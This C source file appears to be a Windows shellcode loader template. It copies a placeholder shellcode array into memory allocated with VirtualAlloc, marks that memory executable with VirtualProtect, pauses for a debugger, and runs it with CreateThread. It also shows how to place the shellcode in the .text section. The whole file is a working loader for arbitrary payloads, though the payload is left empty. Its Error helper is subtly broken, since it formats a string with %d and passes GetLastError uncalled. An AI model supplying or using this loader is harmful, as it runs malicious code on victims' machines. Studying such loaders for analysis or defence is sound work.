//
// Created by dev on 10/14/25.
//

#include <windows.h>
#include <stdio.h>

int Error(const char* errMsg) {
    printf("%d (%d)\n", errMsg, GetLastError);
    return 1;
}

// Uncomment the following to force shellcode to be loaded into .text section

// For non mingw
/*
#pragma section(".text")
__declspec(allocate(".text"))unsigned char shellcode [] =
    "...";

// mingw
__attribute__((section(".text")))unsigned char shellcode[] =
    "...";
*/

int main() {
    // Comment the following if using above code segment
    unsigned char shellcode[] =
        "...";

    unsigned int shellcode_len = (sizeof shellcode) - 1;
    DWORD lpflOldProtect = 0;

    // Memory
    void* procBuff = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!procBuff) {
        return Error("Failure at VirtualAlloc");
    }

    printf("|- Shellcode     -| : 0x%-016p\n", (void*)shellcode);
    printf("|- Memory Buffer -| : 0x%-016p\n", (void*)procBuff);

    // Put shellcode in allocated memory R/W
    RtlMoveMemory(procBuff, shellcode, shellcode_len);
    // Change memory permissions to R/E
    BOOL procMemCheck = VirtualProtect(procBuff, shellcode_len, PAGE_EXECUTE_READ, &lpflOldProtect);
    if (procMemCheck == 0) {
        return Error("Error occurred with VirtualProtect");
    }

    printf("Attach debugger to search process memory: \n");
    getchar();

    if (procBuff) {
        // Creates thread that runs in virtual space of calling process
        HANDLE procThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)procBuff, 0, 0, 0);
        WaitForSingleObject(procThread, INFINITE);
    }

    return 0;
}